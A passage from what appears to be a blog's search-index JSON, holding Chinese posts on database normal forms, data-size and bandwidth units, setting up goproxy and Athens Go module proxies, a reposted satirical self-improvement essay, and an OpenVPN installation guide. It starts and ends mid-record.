[实现MAC远程桌面](http://yuqiangcoder.com/2019/11/22/frp-内网穿透-实现MAC远程桌面.html)","tags":["frp"],"categories":["系统"]},{"title":"数据库范式和函数依赖","url":"%2Fp%2F2e33702e.html","content":"\n\n\n### 1. 函数依赖\n\n##### 1.1 函数依赖(有我就能决定你)\n\n设X,Y是关系R的两个属性集合，当任何时刻R中的任意两个元组中的X属性值相同时，则它们的Y属性值也相同，则称X函数决定Y，或Y函数依赖于X。\n\n<!-- more -->\n\n##### 1.2. 平凡函数依赖(我决定的值还是我自己内部, 走不出自我, 于是平凡的我)\n\n当关系中属性集合Y是属性集合X的子集时(Y⊆X)，存在函数依赖X→Y，即一组属性函数决定它的所有子集，这种函数依赖称为平凡函数依赖。\n\n##### 1.3 非平凡函数依赖(我决定的值大千世界)\n\n当关系中属性集合Y不是属性集合X的子集时，存在函数依赖X→Y，则称这种函数依赖为非平凡函数依赖。\n\n##### 1.4. 完全函数依赖 (我要和别人一起决定你)\n\n设X,Y是关系R的两个属性集合，X’是X的真子集，存在X→Y，但对每一个X’都有X’!→Y，则称Y完全函数依赖于X。\n\n##### 1.5. 部分函数依赖(我的一部分就能决定你)\n\n设X,Y是关系R的两个属性集合，存在X→Y，若X’是X的真子集，存在X’→Y，则称Y部分函数依赖于X。\n\n##### 1.6. 传递函数依赖 (决定的传递关系)\n\n设X,Y,Z是关系R中互不相同的属性集合，存在X→Y(Y !→X),Y→Z，则称Z传递函数依赖于X。\n\n\n\n### 2. 属性关系\n\n属性之间有三种关系，但并不是每一种关系都存在函数依赖。设R(U)是属性集U上的关系模式，X、Y是U的子集：\n\n● 如果X和Y之间是1：1关系（一对一关系），如学校(X)和校长(Y)之间就是1:1关系，则存在函数依赖X → Y和Y →X。\n\n● 如果X和Y之间是1：n关系（一对多关系），如年龄(X)和姓名(Y)之间就是1:n关系，则存在函数依赖Y → X。\n\n●如果X和Y之间是m：n关系（多对多关系），如学生(X)和课程(Y)之间就是m:n关系，则X和Y之间不存在函数依赖。\n\n\n\n### 3. 范式\n\n关系数据库有六种，一、二、三、四、五和BC。\n\n##### 3.1 1NF (问题: 同字段内容重复, 要拆表->2NF)\n\n如果关系模式R是第一范式的模式，那么，R的每一个关系r的属性都是原子项，不可分割。\n\n1NF是关系模式应具备的最起码的条件，如果数据库设计不能满足第一范式，就不能称为关系型数据库。\n\n关系数据库自带1NF\n\n\n\n##### 3.2 2NF (问题: 非主属性不同字段之间关联, 要拆表->3NF)\n\n如果关系模式R是1NF，且每一个非主属性完全依赖于候选建，那么就称R是第二范式。\n\n第二范式要满足的条件：首先要满足第一范式，其次每一个非主属性要**完全函数**依赖于候选键，或者是主键。也就是说，每个非主属性是由整个主键函数决定的，而不能有主键的一部分来决定。\n\n\n\n##### 3.3 3NF (问题: 主属性不同字段之间关联, 要拆表->BCNF)\n\n如果关系模式R是2NF，且关系模式R（U,F）中的所有非主属性对任何候选关键字都不存在传递依赖，则称关系R是属于第三范式。\n\n第三范式（3NF）；符合2NF，并且，消除传递依赖。\n\n\n\n##### 3.4 BCNF\n\n符合3NF，并且，主属性不依赖于主属性。若关系模式R属于第一范式，且每个属性都不传递依赖于键码，则R属于BC范式。\n\n\n\n在某些特殊情况下，即使关系模式符合 3NF 的要求，仍然存在着插入异常，修改异常与删除异常的问题，仍然不是 ”好“ 的设计。\n\n造成此问题的原因：存在着主属性对于码的部分函数依赖与传递函数依赖。\n\n\n\n##### 3.5 总结\n\n应用的范式越高，则表越多。表多会带来很多问题：1 查询时要连接多个表，增加了查询的复杂度. 2 查询时需要连接多个表，降低了数据库查询性能\n\n所以有的时候需要应用反范式化\n\n+ 2NF在1NF的基础之上，消除了**非主属性**对于码的部分函数依赖。\n+ 3NF在2NF的基础之上，消除了**非主属性**对于码的传递函数依赖。\n+ BCNF 在3NF的基础上，消除**主属性**对于码的部分与传递函数依赖。\n\n\n\n### 4. 其他概念\n\n##### 4.1 码\n\n设 K 为某表中的一个属性或属性组，若除 K 之外的所有属性都完全函数依赖于 K（这个“完全”不要漏了），那么我们称 K 为**候选码**，简称为**码**。在实际中我们通常可以理解为：假如当 K 确定的情况下，该表除 K 之外的所有属性的值也就随之确定，那么 K 就是码。一张表中可以有超过一个码。（实际应用中为了方便，通常选择其中的一个码作为主码）\n\n##### 4.2 主属性\n\n包含在任何一个码中的属性成为主属性。非主属性反之.\n\n\n\n### 5. 参考资料\n\n+ https://www.zhihu.com/question/24696366\n+ https://www.cnblogs.com/rosesmall/p/9585655.html","tags":["sql"],"categories":["sql"]},{"title":"文件大小和网速的单位","url":"%2Fp%2F3160c079.html","content":"\n\n\n### 1. 比特\n\n计算机发出的信号都是数字形式的, 比特(bit)来源于 `binary digit`, 意思是一个二进制数字. 因此一个比特就是二进制数字中的一个1 或 0.\n\n<!-- more -->\n\n### 2. 网络速率(1000)\n\n速率是计算机网络中最重要的一个性能指标,  速率的单位是 `bit/s` | `b/s` |` bps`  (比特每秒)\n\n+ k = 10的3次方  (kbit/s)\n\n+ M = 10的6次方 (Mbit/s)\n+ G = 10的9次方\n+ T = 10的12次方\n+ .......(1000单位)\n\n\n\n### 3. 计算机存储(1024*8)\n\n计算机的数据量常常用 B 作为度量的单位(B代表byte), 通常一个字节代表8个比特.\n\n+ K = 2的10次方\n+ M = 2的20次方\n+ G = 2的30次方\n+ T = 2的40次方\n+ .......(1024单位)\n\n\n\n### 4. 总结\n\n\n\n##### 4.1 计算\n\n> 15G的数据块以10G 的速率传送, 需要多少时间? \n\n表明有 15 * 2的30次方 * 8 `比特`的数据块以 10 * 10的9次方 `b/s` 的速率传送, 两个相除就是时间\n\n\n\n##### 4.2 区分\n\n+ 在计算机领域中, 所有的单位都使用大写字母(K, M, G....)\n+ 在通信领域中, 只有1000使用 k, 其余的都用大写(M, G....)\n+ 有的不严格区分, 大写的 K 即可以表示1000, 也可以表示1024\n\n \n\n##### 4.3 生活常识\n\n我们说的几M带宽是以比特为单位的，而我们常看到的下载速度显示的几KB是以字节为单位\n\n100M的网的话理论下载速度:\n\n100×1000×1000＝100000000位，因为8个位等于1个字节，所以这个速度每秒可下载\n\n100000000位÷8=12500000字节，而1024字节＝1K字节，所以换算结果：\n\n12500000字节÷1024≈12207.03K字节，1024K字节就等于1M字节，换算结果：\n\n12207.03K字节÷1024≈11.92M\n\n\n\n有的计算方式是直接除以8, 是12.5M\n\n\n\n### 5. 参考资料 \n\n+ 计算机网络第7版(谢希仁)","tags":["单位"],"categories":["计算机基础"]},{"title":"goproxy的部署实践","url":"%2Fp%2F74b41bb2.html","content":"\n### 0. 前言\n\n在大陆地区我们无法直接通过 `go get` 命令获取到一些第三方包，最常见的就是 `golang.org/x` 下面的各种优秀的包. 解决方案如下:\n\n```bash\n# go.1.12.x\nexport GO111MODULE=on\nexport GOPROXY=https://goproxy.cn\n\n# go1.13.x\ngo env -w GOPROXY=https://goproxy.cn,direct\ngo env -w GOPRIVATE=*.corp.example.com \n\n#GOPRIVATE=*.corp.example.com 表示所有模块路径以 corp.example.com 的下一级域名 (如 team1.corp.example.com) 为前缀的模块版本都将不经过 Go module proxy 和 Go checksum database，需要注意的是不包括 corp.example.com 本身。\n```\n\n<!-- more -->\n\n\n\n本文将重点介绍 go module 的 proxy 配置实现，包括如下两种的代理配置：\n\n- GOPROXY\n- Athens\n\n### 1.  goproxy\n\nhttps://github.com/goproxyio/goproxy\n\n\n\n##### 1.1 安装go\n\n```bash\nwget https://dl.google.com/go/go1.13.4.linux-amd64.tar.gz #下载go\nsudo tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz # 解压到/usr/local\nexport PATH=$PATH:/usr/local/go/bin # 设置环境变量\ngo version # go version go1.13.4 linux/amd64\n```\n\n\n\n##### 1.2 安装goproxy\n\n```bash\ngit clone https://github.com/goproxyio/goproxy.git\ncd goproxy/\nmake\n```\n\n\n\n##### 1.3 代理\n\n```bash\n# 服务端执行\n./bin/goproxy -cacheDir=/tmp/test -listen=0.0.0.0:8082 \n\n\n# 客户端操作\nGOPROXY=http://服务端ip:8082 go get -v github.com/spf13/cobra # 会缓存在服务端/tmp/test目录下\n```\n\n\n\n##### 1.4 nginx配置\n\n```nginx\n./bin/goproxy -cacheDir=/tmp/test -listen :8082 -proxy https://goproxy.cn -exclude liuvv.com\n\n\nserver {\n    server_name goproxy.liuvv.com;\n    listen 80 ;\n    listen 443 ssl http2 ;\n    access_log /var/log/nginx/goproxy_access_log;\n    error_log /var/log/nginx/goproxy_error_log notice;\n\n    location  / {\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_connect_timeout 300s;\n        proxy_send_timeout 300s;\n        proxy_read_timeout 300s;\n\n        proxy_pass             http://127.0.0.1:8082;\n    }\n}\n```\n\n\n\n### 2.  Athens\n\nhttps://github.com/gomods/athens\n\n\n\n```bash\ngit clone https://github.com/gomods/athens \ncd athens \n\nmake build-ver VERSION=\"0.7.0\" # 如果下载不下来, 修改makefile的goproxy\n./athens -version\n```\n\n\n\n服务器启动\n\n```bash\nexport ATHENS_STORAGE_TYPE=disk  # 缓存到硬盘\nexport ATHENS_DISK_STORAGE_ROOT=~/athens-storage\n./athens\n```\n\n\n\n客户端测试\n\n```bash\nexport GO111MODULE=on export GOPROXY=http:#服务器ip:3000\n\n\ngit clone https://github.com/athens-artifacts/walkthrough.git \ncd walkthrough\ngo run .  # 会缓存在服务端~/athens-storage目录下\n\n\ncurl 服务器ip:3000/github.com/athens-artifacts/samplelib/@v/list\n```\n\n\n\n### 3. 参考资料\n\n+ [Hello，Go module proxy](https://tonybai.com/2018/11/26/hello-go-module-proxy/)\n+ [Go Module Proxy](https://juejin.im/post/5c8f9f8ef265da612c3a34b9)\n+ https://blog.wolfogre.com/posts/golang-package-history/\n+ https://juejin.im/post/5d8ee2db6fb9a04e0b0d9c8b\n+ https://github.com/goproxy/goproxy.cn/","tags":["golang"],"categories":["golang"]},{"title":"【转载】如何超过大多数人","url":"%2Fp%2F48fcb916.html","content":"\n\n\n当你看到这篇文章的标题，你一定对这篇文章产生了巨大的兴趣，因为你的潜意识在告诉你，这是一本人生的“武林秘籍”，而且还是左耳朵写的，一定有干货满满，只要读完，一定可以练就神功并找到超过大多数人的快车道和捷径……然而…… 当你看到我这样开篇时，你一定会觉得我马上就要有个转折，告诉你这是不可能的，一切都需要付出和努力……然而，你错了，这篇文章还真就是一篇“秘籍”，只要你把这些“秘籍”用起来，你就一定可以超过大多数人。而且，这篇文章只有我这个“人生导师”可以写得好。毕竟，我的生命过到了十六进制2B的年纪，踏入这个社会已超过20年，舍我其谁呢？！\n\nP.S. 这篇文章借鉴于《[如何写出无法维护的代码](https://coolshell.cn/articles/4758.html)》一文的风格……嘿嘿\n\n<!-- more -->\n\n\n\n### 1. 相关技巧和最佳实践\n\n要超过别人其实还是比较简单的，尤其在今天的中国，更是简单。因为，你只看看中国的互联网，你就会发现，他们基本上全部都是在消费大众，让大众变得更为地愚蠢和傻瓜。**所以，在今天的中国，你基本上不用做什么，只需要不使用中国互联网，你就很自然地超过大多数人了**。当然，如果你还想跟他们彻底拉开，甩他们几个身位，把别人打到底层，下面的这些“技巧”你要多多了解一下。\n\n在信息获取上，你要不断地向大众鼓吹下面的这些事：\n\n- 让大家都用百度搜索引擎查找信息，订阅微信公众号或是到知乎上学习知识……要做到这一步，你就需要把“百度一下”挂在嘴边，然后要经常在群或朋友圈中转发微信公众号的文章，并且转发知乎里的各种“如何看待……”这样的文章，让他们**爱上八卦**，**爱上转发**，**爱上碎片**。\n- 让大家到微博或是知识星球上粉一些大咖，密切关注他们的言论和动向……是的，告诉大家，大咖的任何想法一言一行都可以在微博、朋友圈或是知识星球上获得，让大家相信，你的成长和大咖的见闻和闲扯非常有关系，你跟牛人在一个圈子里你也会变牛。\n- 把今日头条和抖音这样的APP推荐给大家……你只需要让你有朋友成功地安装这两个APP，他们就会花大量的时间在上面，而不能自拔，要让他们安装其实还是很容易的，你要不信你就装一个试玩一会看看（嘿嘿嘿）。\n- 让大家热爱八卦，八卦并不一定是明星的八卦，还可以是你身边的人，比如，公司的同事，自己的同学，职场见闻，社会热点，争议话题，……**这些东西总有一些东西会让人心态有很多微妙的变化，甚至花大量的时间去搜索和阅读大量的观点，以及花大量时间与人辩论争论，这个过程会让人上瘾，让人欲罢不能，然而这些事却和自己没有半毛钱关系。你要做的事就是转发其中一些SB或是很极端的观点，造成大家的一睦讨论后，就早早离场……**\n- 利用爱国主义，让大家觉得不用学英文，不要出国，不要翻墙，咱们已经是强国了……这点其实还是很容易做到的，因为学习是比较逆人性的，所以，只要你鼓吹那些英文无用论，出国活得更惨，国家和民族都变得很强大，就算自己过得很底层，也有大国人民的感觉。\n\n然后，在知识学习和技能训练上，让他们不得要领并产生幻觉\n\n- 让他们**混淆认识和知识**，以为开阔认知就是学习，让他们有学习和成长的幻觉……\n- 培养他们要学会使用碎片时间学习。**等他们习惯利用碎片时间吃快餐后，他们就会失去精读一本书的耐性……**\n- 不断地给他们各种各样“有价值的学习资料”，让他们抓不住重点，成为一个微信公众号或电子书“收藏家”……\n- 让他们看一些枯燥无味的基础知识和硬核知识，这样让他们只会用“死记硬背”的方式来学习，甚至直接让他们失去信心，直接放弃……\n- 玩具手枪是易用的，重武器是难以操控的，多给他们一些玩具，这样他们就会对玩具玩地得心应手，觉得玩玩具就是自己的专业……\n- 让他们喜欢直接得到答案的工作和学习方式，成为一个伸手党，从此学习再也不思考……\n- 告诉他们东西做出来就好了，不要追求做漂亮，做优雅，这样他们就会慢慢地变成劳动密集型……\n- 让他们觉得自己已经很努力了，剩下的就是运气，并说服他们去‘及时行乐’，然后再也找不到高阶和高效率学习的感觉……\n- 让他们觉得“读完书”、“读过书”就行了，不需要对书中的东西进行思考，进行总结，或是实践，只要囫囵吞枣尽快读完就等同于学好了……\n\n最后，在认知和格局上，彻底打垮他们，让他们变成韭菜。\n\n- 让他们不要看到大的形势，只看到眼前的一亩三分地，做好一个井底之蛙。其实这很简单，比如，你不要让他们看到整个计算机互联网技术改变人类社会的趋势，你要多让他看到，从事这一行业的人有多苦逼，然后再说一下其它行业或职业有多好……\n- 宣扬一夜暴富以及快速挣钱的案例，**最好让他们进入“赌博类”或是“传销类”的地方，比如：股市、数字货币……要让他们相信各种财富神话，相信他们就是那个幸运儿，**他们也可以成为巴菲特，可以成为马云……\n- 告诉他们，一些看上去很难的事都是有捷径的，比如：21天就能学会机器学习，用区块链就能颠覆以及重构整个世界等等……\n- 多跟他们讲一些小人物的励志的故事，这样让他们相信，不需要学习高级知识，不需要掌握高级技能，只需要用低等的知识和低级的技能，再加上持续不断拼命重复现有的工作，终有一天就会成功……\n- 多让他们跟别人比较，**人比人不会气死人，但是会让人变得浮躁，变得心急，变得焦虑，当一个人没有办法控制自己的情绪，没有办法让自己静下心来，人会失去耐性和坚持，开始好大喜欢功，开始装逼，开始歪门邪道剑走偏锋……**\n- 让他们到体制内的一些非常稳定的地方工作，这样他们拥有不思进取、怕承担责任、害怕犯错、喜欢偷懒、得过且过的素质……\n- 让他们到体制外的那些喜欢拼命喜欢加班的地方工作，告诉他们爱拼才会赢，努力加班是一种福报，青春就是用来拼的，让他们喜欢上使蛮力的感觉……\n- 告诉他们你的行业太累太辛苦，干不到30岁。让他们早点转行，不要耽误人生和青春……\n- 当他们要做决定的时候，一定要让他们更多的关注自己会失去的东西，而不是会得到的东西。培养他们患得患失心态，让他们认识不到事物真正的价值，失去判断能力……（比如：让他们觉得跟对人拍领导的马屁忠于公司比自我的成长更有价值）\n- 告诉他们，你现有的技能和知识不用更新，就能过好一辈子，新出来的东西没有生命力的……这样他们就会像我们再也不学习的父辈一样很快就会被时代所抛弃……\n- **每个人都喜欢在一些自己做不到的事上找理由，这种能力不教就会**，比如，事情太多没有时间，因为工作上没有用到，等等，你要做的就是帮他们为他们做不到的事找各种非常合理的理由，比如：没事的，一切都是最好的安排；你得不到的那个事没什么意思；你没有面好主要原因是那个面试官问的问题都是可以上网查得到的知识，而不没有问到你真正的能力上；这些东西学了不用很快会忘了，等有了环境再学也不迟……\n\n**最后友情提示一下，上述的这些“最佳实践”你要小心，是所谓，贩毒的人从来不吸毒，开赌场的人从来不赌博！所以，你要小心别自己也掉进去了！这就是“欲练神功，必先自宫”的道理。**\n\n\n\n### 2. 相关原理和思维模型\n\n对于上面的这些技巧还有很多很多，你自己也可以发明或是找到很多。所以，我来讲讲这其中的一些原理。\n\n一般来说，超过别人一般来说就是两个维度：\n\n1. **在认知、知识和技能上**。这是一个人赖以立足社会的能力（参看《[程序员的荒谬之言还是至理名言？](https://coolshell.cn/articles/4235.html)》和《[21天教你学会C++](https://coolshell.cn/articles/2250.html)》）\n2. **在领导力上**。所谓领导力就是你跑在别人前面，你得要有比别人更好的能力更高的标准（参看《[技术人员发展之路](https://coolshell.cn/articles/17583.html)》）\n\n首先，我们要明白，人的技能是从认识开始，然后通过学校、培训或是书本把“零碎的认知”转换成“系统的知识”，而有要把知识转换成技能，就需要训练和实践，这样才能完成从：认识 -> 知识 -> 技能 的转换。这个转换过程是需要耗费很多时间和精力的，而且其中还需要有强大的学习能力和动手能力，这条路径上有很多的“关卡”，每道关卡都会过滤掉一大部分人。比如：**对于一些比较枯燥的硬核知识来说，90%的人基本上就倒下来，不是因为他们没有智商，而是他们没有耐心。**\n\n##### 认知\n\n要在认知上超过别人，就要在下面几个方面上做足功夫：\n\n1）**信息渠道**。试想如果别人的信息源没有你的好，那么，**这些看不见信息源的人，只能接触得到二手信息甚至三手信息，只能获得被别人解读过的信息，这些信息被三传两递后必定会有错误和失真，甚至会被传递信息的中间人hack其中的信息（也就是“中间人攻击”），而这些找不出信息源的人，只能“被人喂养”，于是，他们最终会被困在信息的底层，永世不得翻身。**（比如：学习C语言，放着原作者K&R的不用，硬要用错误百出谭浩强的书，能有什么好呢？）\n\n2）**信息质量**。信息质量主要表现在两个方面，一个是信息中的燥音，另一个是信息中的质量等级，我们都知道，在大数据处理中有一句名言，叫 garbage in garbage out，你天天看的都是垃圾，你的思想和认识也只有垃圾。所以，如果你的信息质量并不好的话，你的认知也不会好，而且你还要花大量的时间来进行有价值信息的挖掘和处理。\n\n3）**信息密度**。优质的信息，密度一般都很大，因为这种信息会逼着你去干这么几件事，a）搜索并学习其关联的知识，b）沉思和反省，c）亲手去推理、验证和实践……一般来说，经验性的文章会比知识性的文章会更有这样的功效。比如，类似于像 Effiective C++/Java，设计模式，Unix编程艺术，算法导论等等这样的书就是属于这种密度很大的书，而像[Netflix的官方blog](https://medium.com/netflix-techblog)和[AWS CTO的blog](https://www.allthingsdistributed.com/)等等地方也会经常有一些这样的文章。\n\n##### 知识\n\n要在知识上超过别人，你就需要在下面几个方面上做足功夫：\n\n1）**知识树（图）**。任何知识，只在点上学习不够的，需要在面上学习，这叫系统地学习，这需要我们去总结并归纳知识树或知识图，一个知识面会有多个知识板块组成，一个板块又有各种知识点，一个知识点会导出另外的知识点，各种知识点又会交叉和依赖起来，学习就是要系统地学习整个知识树（图）。而我们都知道，**对于一棵树来说，“根基”是非常重要的，所以，学好基础知识也是非常重要的，对于一个陌生的地方，有一份地图是非常重要的，没有地图的你只会乱窜，只会迷路、练路、走冤枉路！**\n\n2）**知识缘由**。任何知识都是有缘由的，了解一个知识的来龙去脉和前世今生，会让你对这个知识有非常强的掌握，而不再只是靠记忆去学习。靠记忆去学习是一件非常糟糕的事。而对于一些操作性的知识（不需要了解由来的），我把其叫操作知识，就像一些函数库一样，这样的知识只要学会查文档就好了。**能够知其然，知其所以然的人自然会比识知识到表皮的人段位要高很多。**\n\n3）**方法套路**。学习不是为了找到答案，而是找到方法。就像数学一样，你学的是方法，是解题思路，是套路，会用方程式解题的和不会用方程式解题的在解题效率上不可比较，而在微积分面前，其它的解题方法都变成了渣渣。**你可以看到，掌握高级方法的人比别人的优势有多大，学习的目的就是为了掌握更为高级的方法和解题思路**。\n\n##### 技能\n\n要在技能上超过别人，你就需要在下面几个方面做足功夫：\n\n1）**精益求精**。如果你想拥有专业的技能，你要做不仅仅是拼命地重复一遍又一遍的训练，而是在每一次重复训练时你都要找到更好的方法，总结经验，让新的一遍能够更好，更漂亮，更有效率，否则，用相同的方法重复，那你只不过在搬砖罢了。\n\n2）**让自己犯错**。犯错是有利于成长的，这是因为出错会让人反思，反思更好的方法，反思更完美的方案，总结教训，寻求更好更完美的过程，是技能升级的最好的方式。尤其是当你在出错后，被人鄙视，被人嘲笑后，你会有更大的动力提升自己，这样的动力才是进步的源动力。当然，千万不要同一个错误重复地犯！\n\n3）**找高手切磋**。下过棋，打个球的人都知道，你要想提升自己的技艺，你必需找高手切磋，在和高手切磋的过程中你会感受到高手的技能和方法，有时候你会情不自禁地哇地一下，我靠，还可以这么玩！\n\n##### 领导力\n\n最后一个是领导力，要有领导力或是影响力这个事并不容易，这跟你的野心有多大，好胜心有多强 ，你愿意付出多少很有关系，因为一个人的领导力跟他的标准很有关系，因为有领导力的人的标准比绝大多数人都要高。\n\n1）**识别自己的特长和天赋**。首先，每个人DNA都可能或多或少都会有一些比大多数人NB的东西（当然，也可能没有），如果你有了，那么在你过去的人生中就一定会表现出来了，就是那种大家遇到这个事会来请教你的寻求你帮助的现象。那种，别人要非常努力，而且毫不费劲的事。一旦你有了这样的特长或天赋，那你就要大力地扩大你的领先优势，千万不要进到那些会限制你优势的地方。你是一条鱼，你就一定要把别人拉到水里来玩，绝对不要去陆地上跟别人拼，不断地在自己的特长和天赋上扩大自己的领先优势，彻底一骑绝尘。\n\n2）**识别自己的兴趣和事业**。没有天赋也没有问题，还有兴趣点，都说兴趣是最好的老师，当年，Linus就是在学校里对minx着迷了，于是整出个Linux来，这就是兴趣驱动出的东西，一般来说，兴趣驱动的事总是会比那些被动驱动的更好。但是，这里我想说明一下什么叫“真∙兴趣”，真正的兴趣不是那种三天热度的东西，而是那种，你愿意为之付出一辈子的事，是那种无论有多大困难有多难受你都要死磕的事，这才是“真∙兴趣”，这也就是你的“野心”和“好胜心”所在，其实上升到了你的事业。相信我，绝大多数人只有职业而没有事业的。\n\n3）**建立高级的习惯和方法**。没有天赋没有野心，也还是可以跟别人拼习惯拼方法的，只要你有一些比较好的习惯和方法，那么你一样可以超过大多数人。对此，在习惯上你要做到比较大多数人更自律，更有计划性，更有目标性，比如，每年学习一门新的语言或技术，并可以参与相关的顶级开源项目，每个月训练一个类算法，掌握一种算法，每周阅读一篇英文论文，并把阅读笔记整理出来……**自律的是非常可怕的**。除此之外，你还需要在方法上超过别人，你需要满世界的找各种高级的方法，其中包括，思考的方法，学习的方法、时间管理的方法、沟通的方法这类软实力的，还有，解决问题的方法（trouble shooting 和 problem solving），设计的方法，工程的方法，代码的方法等等硬实力的，一开始照猫画虎，时间长了就可能会自己发明或推导新的方法。\n\n4）**勤奋努力执着坚持**。如果上面三件事你都没有也没有能力，那还有最后一件事了，那就是勤奋努力了，就是所谓的“一万小时定律”了（参看《[21天教你学会C++](https://coolshell.cn/articles/2250.html)》中的十年学编程一节），我见过很多不聪明的人，悟性也不够（比如我就是一个），别人学一个东西，一个月就好了，而我需要1年甚至更长，但是很多东西都是死的，只要肯花时间就有一天你会搞懂的，耐不住我坚持十年二十年，聪明的人发明个飞机飞过去了，笨一点的人愚公移山也过得去，**因为更多的人是懒人，我不用拼过聪明人，我只用拼过那些懒人就好了**。\n\n好了，就这么多，如果哪天你变得消极和不自信，你要来读读我的这篇文章，子曰：温故而知新。\n\n（全文完）\n\n\n\n### 3. 参考资料\n\n+ https://coolshell.cn/articles/19464.html","tags":["思考"],"categories":["思考"]},{"title":"openvpn搭建虚拟局域网","url":"%2Fp%2Fa84d9911.html","content":"\n\n\n### 0. 前言\n\nOpenVPN 是一个健壮的、高度灵活的 [VPN](https://en.wikipedia.org/wiki/VPN) 守护进程。它支持 [SSL/TLS](https://en.wikipedia.org/wiki/SSL/TLS) 安全、[Ethernet bridging](https://en.wikipedia.org/wiki/Bridging_(networking))、经由[代理](https://en.wikipedia.org/wiki/Proxy_server)的 [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) 或 [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol) [隧道](https://en.wikipedia.org/wiki/Tunneling_protocol)和 [NAT](https://en.wikipedia.org/wiki/Network_address_translation)。另外，它也支持动态 IP 地址以及 [DHCP](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)，可伸缩性足以支持数百或数千用户的使用场景，同时可移植至大多数主流操作系统平台上。\n\n##### 安装openvpn\n\n```bash\nsudo apt install openvpn\n```\n\n<!-- more -->\n\n\n\n### 1. 生成证书\n\n```bash\ngit clone https://github.com/OpenVPN/easy-rsa\ncd easyrsa3\n```\n\n\n\n##### 1.1 生成 CA\n\n```bash\n./easyrsa init-pki\n\n./easyrsa build-ca  \n# 输入密码: 123456\nCommon Name: OpenVPN-CA\n```\n\npki文件夹下会生成 ca.crt\n\n\n\n##### 1.2 生成server和 client 公钥私钥对\n\n```bash\n./easyrsa build-server-full server\n\n./easyrsa build-client-full client1\n./easyrsa build-client-full client2\n./easyrsa build-client-full client3\n```\n\npki/private 是私有的 key\n\npki/issued 是公有的 key\n\n\n\n##### 1.3 生成Diffie-Hellman pem \n\n```bash\n./easyrsa gen-dh\n```\n\npki 文件夹下生成了 dh.pem\n\n\n\n##### 1.4 现在我们有了\n\n| **Filename** | **Needed By**            | **Purpose**               | **Secret** |\n| ------------ | ------------------------ | ------------------------- | ---------- |\n| ca.crt       | server + all clients     | Root CA certificate       | NO         |\n| ca.key       | key signing machine only | Root CA key               | YES        |\n| dh{n}.pem    | server only              | Diffie Hellman parameters | NO         |\n| server.crt   | server only              | Server Certificate        | NO         |\n| server.key   | server only              | Server Key                | YES        |\n| client1.crt  | client1 only             | Client1 Certificate       | NO         |\n| client1.key  | client1 only             | Client1 Key               | YES        |\n| client2.crt  | client2 only             | Client2 Certificate       | NO         |\n| client2.key  | client2 only             | Client2 Key               | YES        |\n| client3.crt  | client3 only             | Client3 Certificate       | NO         |\n| client3.key  | client3 only             | Client3 Key               | YES        |\n\n\n\n### 2. 配置文件\n\n在安装目录下(`/usr/share/doc/openvpn/examples/sample-config-files`)找到配置 `server.conf` and `client.conf`\n\n如果只有有 server.conf.gz 的话, 需要解压\n\n```bash\ngunzip -c server.conf.gz > server.conf\n```\n\n\n\n##### 2.1  服务端修改证书路径\n\nBefore you use the sample configuration file, you should first edit the **ca**, **cert**, **key**, and **dh** parameters to point to the files you generated in the [PKI](https://openvpn.net/community-resources/how-to/#setting-up-your-own-certificate-authority-ca-and-generating-certificates-and-keys-for-an-openvpn-server-and-multiple-clients) section above.\n\n##### 2.2 服务端dev 模式可以修改  tap tun\n\n##### 2.3 服务端修改 ip 范围\n\nIf you want to use a virtual IP address range other than `10.8.0.0/24`, you should modify the `server` directive. Remember that this virtual IP address range should be a private range which is currently unused on your network.\n\n\n\nThe Internet Assigned Numbers Authority (IANA) has reserved the following three blocks of the IP address space for private internets (codified in RFC 1918):\n\n| 10.0.0.0    | 10.255.255.255  | (10/8 prefix)       |\n| ----------- | --------------- | ------------------- |\n| 172.16.0.0  | 172.31.255.255  | (172.16/12 prefix)  |\n| 192.168.0.0 | 192.168.255.255 | (192.168/16 prefix) |\n\nThe best candidates are subnets in the middle of the vast 10.0.0.0/8 netblock (for example 10.66.77.0/24).\n\n\n\n##### 2.4 服务端修改 client 之间可连接\n\nUncomment out the `client-to-client` directive if you would like connecting clients to be able to reach each other over the VPN. By default, clients will only be able to reach the server.\n\n##### 2.5 服务端修改 user 和 group\n\nIf you are using Linux, BSD, or a Unix-like OS, you can improve security by uncommenting out the **user nobody** and **group nobody** directives.\n\n##### 2.6 客户端修改证书路径\n\n`ca`, `cert`, `key`\n\n##### 2.7 客户端修改 remote 参数\n\n```bash\nremote my-server-1 1194\n```\n\n\n\n##### 2.8 服务器和客户端的 `dev` (tun or tap) and `proto` (udp or tcp) 要一致\n\n\n\n### 3. 启动使用\n\n##### 3.1 启动 server\n\n```bash\nsudo openvpn /etc/openvpn/server.conf\n```\n\n成功启动以后会发现多了一个 tun 网口\n\n\n\n如遇到错误: [Open VPN options error: --tls-auth fails with 'ta.key': no such file or directory](https://unix.stackexchange.com/questions/359428/open-vpn-options-error-tls-auth-fails-with-ta-key-no-such-file-or-director)\n\n```bash\nsudo openvpn --genkey --secret /etc/openvpn/certs/ta.key\n```\n\n\n\n##### 3.2 启动 client\n\n``` bash\nsudo openvpn /etc/openvpn/client.conf\n```\n\n\n\n如遇到错误: Authenticate/Decrypt packet error: packet HMAC authentication failed, 配置文件里,\n\n```bash\ntls-auth /etc/openvpn/certs/ta.key 0  #服务器用0\n\ntls-auth /etc/openvpn/certs/ta.key 1  #客户端用1\n```\n\n注意, 这个 key 是同一个, 在服务器生成, 不是每个都生成一次\n\n\n\n##### 3.3 测试\n\n在客户端  `ping 10.8.0.1`\n\nIf the ping succeeds, congratulations! You now have a functioning VPN.\n\n我们也可以 `ssh user@10.8.0.1` 发现也可以\n\n\n\n##### 3.4 mac 使用\n\nhttps://tunnelblick.net/ 下载安装包\n\n可以生成.ovpn 文件, 参考https://serverfault.com/a/483967\n\n\n\n### 4. openvpn服务\n\n##### 4.1 server service\n\n```bash\nsudo systemctl start openvpn@server.service\n\nsudo systemctl enable openvpn@server.service\n```\n\n需要输入密码请这样\n\n```bash\nsudo systemd-tty-ask-password-agent \n```\n\n\n\n##### 4.2 client service\n\n```bash\nsudo systemctl start openvpn@client.service\n\nsudo systemctl enable openvpn@client.service\n```\n\n\n\n### 5. 客户端分配固定 IP\n\n```bash\ncd /etc/openvpn\nmkdir ccd\n\n# 